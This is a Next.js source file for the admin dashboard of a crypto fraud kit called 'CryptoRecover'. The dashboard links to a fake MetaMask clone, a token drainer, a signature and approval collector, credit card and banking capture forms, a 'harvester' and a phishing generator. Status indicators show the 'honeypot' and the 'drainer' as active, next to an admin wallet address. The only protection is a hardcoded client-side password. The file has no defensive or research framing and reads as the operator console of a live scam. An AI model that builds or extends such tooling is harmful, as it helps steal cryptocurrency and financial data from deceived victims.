import { useState } from 'react';
import Head from 'next/head';

export default function AdminPanel() {
  const [password, setPassword] = useState('');
  const [authenticated, setAuthenticated] = useState(false);

  const handleLogin = () => {
    if (password === 'admin2025') {
      setAuthenticated(true);
    } else {
      alert('Invalid password');
    }
  };

  if (!authenticated) {
    return (
      <>
        <Head>
          <title>Admin Panel - CryptoRecover</title>
        </Head>
        <div className="min-h-screen bg-gray-900 flex items-center justify-center">
          <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
            <h1 className="text-2xl font-bold mb-6 text-center">Admin Access</h1>
            <input
              type="password"
              placeholder="Enter admin password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full p-3 border rounded-lg mb-4"
              onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
            />
            <button
              onClick={handleLogin}
              className="w-full bg-blue-600 text-white p-3 rounded-lg hover:bg-blue-700"
            >
              Login
            </button>
          </div>
        </div>
      </>
    );
  }

  return (
    <>
      <Head>
        <title>Admin Dashboard - CryptoRecover</title>
      </Head>
      <div className="min-h-screen bg-gray-100 p-4">
        <div className="max-w-6xl mx-auto">
          <h1 className="text-3xl font-bold mb-8">Admin Dashboard</h1>
          
          <div className="grid md:grid-cols-2 gap-6">
            <div className="bg-white p-6 rounded-lg shadow">
              <h2 className="text-xl font-bold mb-4">Quick Access</h2>
              <div className="grid grid-cols-1 gap-3">
                <a href="/flashed" className="block bg-orange-500 text-white p-3 rounded hover:bg-orange-600 text-center font-bold">
                  MetaMask Honeypot Interface
                </a>
                <a href="/recovery-services" className="block bg-red-500 text-white p-3 rounded hover:bg-red-600 text-center font-bold">
                  Recovery Services (Drainer)
                </a>
                <a href="/" className="block bg-blue-500 text-white p-3 rounded hover:bg-blue-600 text-center font-bold">
                  Main Landing Page
                </a>
                <button onClick={() => window.open('/admin', '_blank')} className="block bg-purple-500 text-white p-3 rounded hover:bg-purple-600 text-center font-bold">
                  Admin Panel
                </button>
              </div>
            </div>
            
            <div className="bg-white p-6 rounded-lg shadow">
              <h2 className="text-xl font-bold mb-4">System Status</h2>
              <div className="space-y-2">
                <div className="flex justify-between">
                  <span>Honeypot Status:</span>
                  <span className="text-green-600 font-bold">Active</span>
                </div>
                <div className="flex justify-between">
                  <span>Drainer Status:</span>
                  <span className="text-green-600 font-bold">Active</span>
                </div>
                <div className="flex justify-between">
                  <span>Admin Wallet:</span>
                  <span className="text-blue-600 font-mono text-xs">0x849842...c237</span>
                </div>
              </div>
            </div>
          </div>
          
          <div className="mt-8 bg-white p-6 rounded-lg shadow">
            <h2 className="text-xl font-bold mb-4">Direct Feature Access</h2>
            <div className="grid md:grid-cols-3 gap-4">
              <div className="border p-4 rounded">
                <h3 className="font-bold text-orange-600 mb-3">Honeypot Features</h3>
                <div className="space-y-2">
                  <button onClick={() => window.open('/flashed', '_blank')} className="w-full bg-orange-500 text-white p-2 rounded hover:bg-orange-600 text-sm">
                    MetaMask Clone
                  </button>
                  <button onClick={() => window.open('/flashed?mode=buy', '_blank')} className="w-full bg-orange-400 text-white p-2 rounded hover:bg-orange-500 text-sm">
                    Buy Interface
                  </button>
                  <button onClick={() => window.open('/flashed?mode=swap', '_blank')} className="w-full bg-orange-300 text-white p-2 rounded hover:bg-orange-400 text-sm">
                    Swap Interface
                  </button>
                </div>
              </div>
              <div className="border p-4 rounded">
                <h3 className="font-bold text-red-600 mb-3">Drainer Features</h3>
                <div className="space-y-2">
                  <button onClick={() => window.open('/recovery-services', '_blank')} className="w-full bg-red-500 text-white p-2 rounded hover:bg-red-600 text-sm">
                    Token Drainer
                  </button>
                  <button onClick={() => window.open('/recovery-services?type=signature', '_blank')} className="w-full bg-red-400 text-white p-2 rounded hover:bg-red-500 text-sm">
                    Signature Collector
                  </button>
                  <button onClick={() => window.open('/recovery-services?type=approval', '_blank')} className="w-full bg-red-300 text-white p-2 rounded hover:bg-red-400 text-sm">
                    Token Approvals
                  </button>
                </div>
              </div>
              <div className="border p-4 rounded">
                <h3 className="font-bold text-blue-600 mb-3">Data Collection</h3>
                <div className="space-y-2">
                  <button onClick={() => window.open('/flashed?collect=card', '_blank')} className="w-full bg-blue-500 text-white p-2 rounded hover:bg-blue-600 text-sm">
                    Credit Card Form
                  </button>
                  <button onClick={() => window.open('/flashed?collect=bank', '_blank')} className="w-full bg-blue-400 text-white p-2 rounded hover:bg-blue-500 text-sm">
                    Banking Form
                  </button>
                  <button onClick={() => window.open('/?advanced=true', '_blank')} className="w-full bg-blue-300 text-white p-2 rounded hover:bg-blue-400 text-sm">
                    Advanced Harvester
                  </button>
                  <button onClick={() => window.open('/phishing-generator', '_blank')} className="w-full bg-blue-200 text-white p-2 rounded hover:bg-blue-300 text-sm">
                    Phishing Generator
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}